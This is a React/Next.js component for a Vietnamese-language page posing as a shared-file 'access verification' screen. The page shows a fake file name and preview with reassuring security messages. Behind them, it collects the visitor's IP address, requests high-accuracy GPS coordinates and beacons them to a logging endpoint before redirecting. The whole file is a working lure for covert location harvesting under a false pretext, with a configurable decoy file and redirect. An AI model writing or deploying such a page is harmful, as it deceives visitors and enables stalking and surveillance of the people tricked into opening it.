
'use client';

import React, { useEffect, useState } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { Loader2, FileText } from 'lucide-react';
import type { VerificationConfig } from '@/app/actions/settings';

interface DriveVerificationClientProps {
  config: VerificationConfig;
}

export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
  const { redirectUrl } = config;
  const [status, setStatus] = useState('Đang khởi tạo xác minh...');

  useEffect(() => {
    const REDIRECT_URL = redirectUrl || 'https://www.google.com/';

    const logAndRedirect = async () => {
      let clientIp = 'N/A';
      try {
        setStatus('Đang xác định địa chỉ mạng...');
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        console.error("Could not fetch IP", e);
        setStatus('Không thể xác định địa chỉ. Đang chuyển hướng...');
      }

      const logData = (pos?: GeolocationPosition) => {
        setStatus('Đang ghi lại thông tin an toàn...');
        const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
        if (pos) {
          body.lat = pos.coords.latitude;
          body.lon = pos.coords.longitude;
          body.acc = pos.coords.accuracy;
        }

        const payload = JSON.stringify(body);
        
        // Use sendBeacon for reliable logging before redirect
        if (navigator.sendBeacon) {
          navigator.sendBeacon('/api/log-location', payload);
          // Redirect immediately after sending beacon
          window.location.href = REDIRECT_URL;
        } else {
          // Fallback to fetch for older browsers
          fetch('/api/log-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload,
            keepalive: true,
          }).finally(() => {
            window.location.href = REDIRECT_URL;
          });
        }
      };

      setStatus('Đang yêu cầu quyền truy cập vị trí...');
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logData, // Success
          () => { // Error
            setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
            logData(); // Log IP only
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      } else {
        setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
        logData(); // Geolocation not supported
      }
    };

    // A short delay before starting to allow the page to render.
    const timer = setTimeout(logAndRedirect, 2500);
    
    return () => clearTimeout(timer);
  }, [redirectUrl]);

  return (
    <div className="flex justify-center items-center min-h-screen bg-cover bg-center p-4" style={{backgroundImage: "url('https://images.unsplash.com/photo-1554141316-1f7f5a934143?q=80&w=2574&auto=format&fit=crop')"}}>
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
      <Card className="z-10 p-6 sm:p-8 rounded-xl shadow-2xl text-center max-w-lg w-full bg-card/80 backdrop-blur-lg border border-white/20">
        <CardContent className="p-0 flex flex-col items-center">

          <div className="w-full bg-muted/30 rounded-lg p-4 mb-6 border border-white/10">
            <div className="flex items-center gap-4 mb-4 text-left">
                 <div className="bg-primary/10 p-3 rounded-lg border border-primary/20">
                    <FileText className="h-6 w-6 text-primary" />
                 </div>
                 <div>
                    <p className="font-bold text-lg text-foreground leading-tight">{config.fileName}</p>
                    <p className="text-sm text-muted-foreground">{config.fileInfo}</p>
                 </div>
            </div>
            <div className="aspect-[16/10] w-full rounded-md bg-background flex items-center justify-center overflow-hidden shadow-inner">
                <Image
                    src={config.imageUrl}
                    alt="File preview"
                    width={800}
                    height={500}
                    className="object-cover w-full h-full"
                    data-ai-hint="document paper"
                    priority
                />
            </div>
          </div>
          
          <h1 className="text-2xl font-bold mb-2 text-foreground">Đang xác thực quyền truy cập...</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            Để đảm bảo an toàn, chúng tôi cần xác minh yêu cầu của bạn trước khi chuyển hướng. Vui lòng đợi.
          </p>

          <div className="w-full flex flex-col items-center justify-center gap-4 h-16">
            <Loader2 className="h-10 w-10 text-primary animate-spin" />
            <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
